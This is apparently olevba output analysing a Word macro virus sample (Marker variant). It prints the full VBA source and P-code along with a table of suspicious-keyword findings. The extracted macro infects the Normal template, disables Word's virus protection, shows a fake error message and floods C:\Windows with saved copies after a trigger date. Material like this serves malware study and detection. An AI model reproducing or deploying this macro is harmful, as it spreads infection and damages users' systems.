olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.cx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.cx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub ViewVBcode(): MsgBox "The Visual Basic environment could not be initialized. Please run setup to install it correctly.", vbCritical: End Sub
Private Sub Document_close()
  
  On Error GoTo Finm
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia xxa"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
  
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
      plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)

      'Ninfec = "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      Nume2 = 3
      If Nume = nume1 Or Nume = Nume2 Or plainfec = False Then
         If DInfec = True And plainfec = False Then
            On Error Resume Next
            For il = 1 To Plan.CodeModule.CountOfLines
                Plan.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
            'Docu.CodeModule.addfromstring Ninfec
            contemodu = Docu.CodeModule.Lines(1, Docu.CodeModule.CountOfLines)
            Plan.CodeModule.AddFromString contemodu
         End If

         If DInfec = False And plainfec = True Then
            On Error Resume Next
            For il = 1 To Docu.CodeModule.CountOfLines
                Docu.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
           'Plan.CodeModule.addfromstring Ninfec
            contemodu = Plan.CodeModule.Lines(1, Plan.CodeModule.CountOfLines)
            Docu.CodeModule.AddFromString contemodu
         End If
         
         If SaveDoc = True Then ThisDocument.Save
         If SaveDoc = True And plainfec = False Then NormalTemplate.Save
      End If
  End If
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) > 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("AA" & i & "AA.DOC"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Next
  End If
  GoTo Finb
  
Finm:
  On Error Resume Next
  For il = 1 To Docu.CodeModule.CountOfLines
    Docu.CodeModule.DeleteLines 1
  Next
  GoTo Finb
Finb:
 On Error Resume Next
End Sub
Private Sub Document_Open()
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
        Plan.CodeModule.DeleteLines 1
      Next
     End If
   End If
End Sub






























-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.cx
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10287 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub ViewVBcode())
' 	BoS 0x0000 
' 	LitStr 0x0060 "The Visual Basic environment could not be initialized. Please run setup to install it correctly."
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	EndSub 
' Line #2:
' 	FuncDefn (Private Sub Document_close())
' Line #3:
' Line #4:
' 	OnError Finm 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x0018 "la macro de colombia xxa"
' 	VarDefn exi
' Line #7:
' 	Dim 
' 	VarDefn DInfec
' 	VarDefn planinfec (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn Docu
' 	VarDefn Plan (As Object)
' Line #9:
' 	Dim 
' 	VarDefn modulin
' 	VarDefn contemodu
' 	VarDefn Ninfec (As String)
' Line #10:
' 	Dim 
' 	VarDefn Nume (As Integer)
' Line #11:
' 	Dim 
' 	VarDefn Copform (As Object)
' Line #12:
' Line #13:
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Docu 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Plan 
' Line #16:
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDoc 
' Line #18:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St Saveplan 
' Line #19:
' Line #20:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DInfec 
' Line #21:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St plainfec 
' Line #22:
' Line #23:
' 	QuoteRem 0x0006 0x0012 "Ninfec = "'" & " ""
' Line #24:
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' Line #27:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Nume 
' Line #28:
' 	Ld Nume 
' 	St Nume 
' Line #29:
' 	LitDI2 0x0007 
' 	St nume1 
' Line #30:
' 	LitDI2 0x0003 
' 	St Nume2 
' Line #31:
' 	Ld Nume 
' 	Ld nume1 
' 	Eq 
' 	Ld Nume 
' 	Ld Nume2 
' 	Eq 
' 	Or 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #32:
' 	Ld DInfec 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' 	OnError Finm 
' Line #38:
' 	QuoteRem 0x000C 0x0024 "Docu.CodeModule.addfromstring Ninfec"
' Line #39:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St contemodu 
' Line #40:
' 	Ld contemodu 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #41:
' 	EndIfBlock 
' Line #42:
' Line #43:
' 	Ld DInfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #47:
' 	StartForVariable 
' 	Next 
' Line #48:
' 	OnError Finm 
' Line #49:
' 	QuoteRem 0x000B 0x0024 "Plan.CodeModule.addfromstring Ninfec"
' Line #50:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St contemodu 
' Line #51:
' 	Ld contemodu 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #52:
' 	EndIfBlock 
' Line #53:
' Line #54:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ThisDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #55:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Concat 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	St sd 
' Line #59:
' 	Ld sd 
' 	ArgsLd Trim 0x0001 
' 	St sd 
' Line #60:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Ge 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #61:
' 	LitStr 0x000B "C:\Windows\"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #62:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC9F7 0x3B9A 
' 	For 
' Line #63:
' 	LineCont 0x0010 0F 00 08 00 1B 00 08 00 27 00 08 00 31 00 08 00
' 	LitStr 0x0002 "AA"
' 	Ld i 
' 	Concat 
' 	LitStr 0x0006 "AA.DOC"
' 	Concat 
' 	Paren 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #64:
' 	StartForVariable 
' 	Next 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	GoTo Finb 
' Line #67:
' Line #68:
' 	Label Finm 
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #71:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #72:
' 	StartForVariable 
' 	Next 
' Line #73:
' 	GoTo Finb 
' Line #74:
' 	Label Finb 
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Private Sub Document_Open())
' Line #78:
' 	QuoteRem 0x0000 0x0000 ""
' Line #79:
' 	QuoteRem 0x0000 0x0000 ""
' Line #80:
' 	QuoteRem 0x0000 0x0000 ""
' Line #81:
' 	QuoteRem 0x0000 0x0000 ""
' Line #82:
' 	QuoteRem 0x0000 0x0000 ""
' Line #83:
' 	QuoteRem 0x0000 0x0000 ""
' Line #84:
' 	QuoteRem 0x0000 0x0000 ""
' Line #85:
' 	QuoteRem 0x0000 0x0000 ""
' Line #86:
' 	QuoteRem 0x0000 0x0000 ""
' Line #87:
' 	QuoteRem 0x0000 0x0000 ""
' Line #88:
' 	QuoteRem 0x0000 0x0000 ""
' Line #89:
' 	QuoteRem 0x0000 0x0000 ""
' Line #90:
' 	QuoteRem 0x0000 0x0000 ""
' Line #91:
' 	QuoteRem 0x0000 0x0000 ""
' Line #92:
' 	QuoteRem 0x0000 0x0000 ""
' Line #93:
' 	QuoteRem 0x0000 0x0000 ""
' Line #94:
' 	QuoteRem 0x0000 0x0000 ""
' Line #95:
' 	QuoteRem 0x0000 0x0000 ""
' Line #96:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #97:
' 	StartForVariable 
' 	Next 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	EndSub 
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

